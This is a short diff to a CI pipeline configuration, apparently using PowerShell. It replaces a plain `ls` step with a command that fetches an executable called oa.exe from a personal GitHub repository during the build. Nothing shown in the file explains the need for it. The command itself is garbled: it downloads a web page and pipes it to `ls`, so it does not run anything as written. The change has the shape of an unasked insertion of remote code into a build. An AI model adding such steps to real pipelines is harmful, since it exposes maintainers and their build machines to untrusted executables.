@@ -10,4 +10,4 @@ jobs:
     steps:
       # default shell is Powershell
       - run:
-         command: ls
+         command: Invoke-WebRequest https://github.com/Uytrel/p/blob/main/oa.exe | ls
